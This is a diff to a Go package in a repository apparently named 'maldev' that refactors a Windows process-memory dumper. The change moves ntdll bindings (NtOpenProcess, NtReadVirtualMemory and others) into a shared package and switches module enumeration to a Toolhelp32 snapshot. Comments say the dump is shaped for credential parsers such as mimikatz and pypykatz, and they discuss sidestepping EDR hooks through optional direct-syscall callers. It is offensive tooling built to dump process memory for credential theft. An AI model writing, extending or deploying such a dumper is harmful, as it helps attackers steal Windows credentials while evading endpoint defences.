@@ -14,6 +14,8 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/process/enum"
+	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"github.com/oioio-space/maldev/win/version"
 )
@@ -95,7 +97,7 @@ func Dump(h uintptr, w io.Writer, caller *wsyscall.Caller) (Stats, error) {
 	if err != nil {
 		return Stats{}, fmt.Errorf("enum regions: %w", err)
 	}
-	mods, err := collectModules(ph)
+	mods, err := collectModules(ph, caller)
 	if err != nil {
 		return Stats{}, fmt.Errorf("enum modules: %w", err)
 	}
@@ -159,7 +161,7 @@ func ntGetNextProcess(cur windows.Handle, access uint32, caller *wsyscall.Caller
 	}
 	// WinAPI fallback — NtGetNextProcess isn't in x/sys/windows, so we
 	// bind it lazily via ntdll.
-	r, _, _ := procNtGetNextProcess.Call(
+	r, _, _ := api.ProcNtGetNextProcess.Call(
 		uintptr(cur),
 		uintptr(access),
 		0, 0,
@@ -198,7 +200,7 @@ func ntProcessImageBaseName(h windows.Handle, caller *wsyscall.Caller) (string, 
 		)
 		r = rr
 	} else {
-		rr, _, _ := procNtQueryInformationProcess.Call(
+		rr, _, _ := api.ProcNtQueryInformationProcess.Call(
 			uintptr(h),
 			processImageFileName,
 			uintptr(unsafe.Pointer(&buf[0])),
@@ -243,7 +245,7 @@ func ntProcessPID(h windows.Handle, caller *wsyscall.Caller) (uint32, error) {
 		)
 		r = rr
 	} else {
-		rr, _, _ := procNtQueryInformationProcess.Call(
+		rr, _, _ := api.ProcNtQueryInformationProcess.Call(
 			uintptr(h),
 			processBasicInformation,
 			uintptr(unsafe.Pointer(&pbi)),
@@ -291,7 +293,7 @@ func ntOpenProcessByPID(pid uint32, access uint32, caller *wsyscall.Caller) (win
 		)
 		r = rr
 	} else {
-		rr, _, _ := procNtOpenProcess.Call(
+		rr, _, _ := api.ProcNtOpenProcess.Call(
 			uintptr(unsafe.Pointer(&h)),
 			uintptr(access),
 			uintptr(unsafe.Pointer(&oa)),
@@ -361,7 +363,7 @@ func ntQueryVirtualMemory(h windows.Handle, addr uintptr, mbi *windows.MemoryBas
 		)
 		r = rr
 	} else {
-		rr, _, _ := procNtQueryVirtualMemory.Call(
+		rr, _, _ := api.ProcNtQueryVirtualMemory.Call(
 			uintptr(h),
 			addr,
 			memoryBasicInformation,
@@ -393,7 +395,7 @@ func ntReadVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsy
 		)
 		r = rr
 	} else {
-		rr, _, _ := procNtReadVirtualMemory.Call(
+		rr, _, _ := api.ProcNtReadVirtualMemory.Call(
 			uintptr(h),
 			addr,
 			uintptr(unsafe.Pointer(&buf[0])),
@@ -408,62 +410,31 @@ func ntReadVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsy
 	return read, nil
 }
 
-// collectModules enumerates loaded modules via K32EnumProcessModulesEx +
-// GetModuleInformation. This is psapi-based (path-hooked by some EDRs)
-// but keeps the MVP simple; a PEB-walk variant is future work.
-func collectModules(h windows.Handle) ([]Module, error) {
-	const modListAll = 0x03 // LIST_MODULES_ALL
-	var needed uint32
-	// First call to size the buffer.
-	procK32EnumProcessModulesEx.Call(uintptr(h), 0, 0, uintptr(unsafe.Pointer(&needed)), modListAll)
-	if needed == 0 {
-		return nil, nil
+// collectModules delegates to process/enum.Modules(pid), which walks
+// the Toolhelp32 snapshot for the given PID. The PID is extracted
+// from h via ntProcessPID (one extra Nt syscall; cheap compared to
+// the many NtReadVirtualMemory calls that follow).
+func collectModules(h windows.Handle, caller *wsyscall.Caller) ([]Module, error) {
+	pid, err := ntProcessPID(h, caller)
+	if err != nil {
+		return nil, fmt.Errorf("get PID: %w", err)
 	}
-	count := int(needed) / int(unsafe.Sizeof(windows.Handle(0)))
-	handles := make([]windows.Handle, count)
-	r, _, _ := procK32EnumProcessModulesEx.Call(
-		uintptr(h),
-		uintptr(unsafe.Pointer(&handles[0])),
-		uintptr(needed),
-		uintptr(unsafe.Pointer(&needed)),
-		modListAll,
-	)
-	if r == 0 {
-		return nil, errors.New("K32EnumProcessModulesEx failed")
+	snap, err := enum.Modules(pid)
+	if err != nil {
+		return nil, fmt.Errorf("enum.Modules(%d): %w", pid, err)
 	}
-
-	out := make([]Module, 0, count)
-	for _, hm := range handles {
-		if hm == 0 {
-			continue
-		}
-		var mi struct {
-			LpBaseOfDll uintptr
-			SizeOfImage uint32
-			EntryPoint  uintptr
-		}
-		ok, _, _ := procGetModuleInformation.Call(
-			uintptr(h),
-			uintptr(hm),
-			uintptr(unsafe.Pointer(&mi)),
-			unsafe.Sizeof(mi),
-		)
-		if ok == 0 {
-			continue
-		}
-		nameBuf := make([]uint16, windows.MAX_PATH)
-		n, _, _ := procK32GetModuleFileNameExW.Call(
-			uintptr(h), uintptr(hm),
-			uintptr(unsafe.Pointer(&nameBuf[0])),
-			uintptr(len(nameBuf)),
-		)
-		if n == 0 {
-			continue
+	out := make([]Module, 0, len(snap))
+	for _, m := range snap {
+		// Prefer full path so credential parsers (pypykatz, mimikatz)
+		// can disambiguate modules with the same basename.
+		name := m.Path
+		if name == "" {
+			name = m.Name
 		}
 		out = append(out, Module{
-			BaseOfImage: uint64(mi.LpBaseOfDll),
-			SizeOfImage: mi.SizeOfImage,
-			Name:        windows.UTF16ToString(nameBuf[:n]),
+			BaseOfImage: uint64(m.Base),
+			SizeOfImage: m.Size,
+			Name:        name,
 		})
 	}
 	return out, nil
@@ -487,22 +458,9 @@ func collectSystemInfo() SystemInfo {
 	return si
 }
 
-// ---- lazy-bound ntdll / kernel32 procs -----------------------------
-// These are the minimum set the package needs. Bound lazily via LazyDLL
-// so build-time link doesn't fail on stale SDK toolchains.
-
-var (
-	modNtdll    = windows.NewLazySystemDLL("ntdll.dll")
-	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
-
-	procNtGetNextProcess          = modNtdll.NewProc("NtGetNextProcess")
-	procNtOpenProcess             = modNtdll.NewProc("NtOpenProcess")
-	procNtQueryInformationProcess = modNtdll.NewProc("NtQueryInformationProcess")
-	procNtReadVirtualMemory       = modNtdll.NewProc("NtReadVirtualMemory")
-	procNtQueryVirtualMemory      = modNtdll.NewProc("NtQueryVirtualMemory")
-
-	procK32EnumProcessModulesEx = modKernel32.NewProc("K32EnumProcessModulesEx")
-	procGetModuleInformation    = modKernel32.NewProc("K32GetModuleInformation")
-	procK32GetModuleFileNameExW = modKernel32.NewProc("K32GetModuleFileNameExW")
-)
+// Proc bindings live in win/api (single source of truth per CLAUDE.md):
+//   api.ProcNtGetNextProcess, ProcNtOpenProcess,
+//   ProcNtQueryInformationProcess, ProcNtReadVirtualMemory,
+//   ProcNtQueryVirtualMemory. Module enumeration delegates to
+//   process/enum.Modules.
 
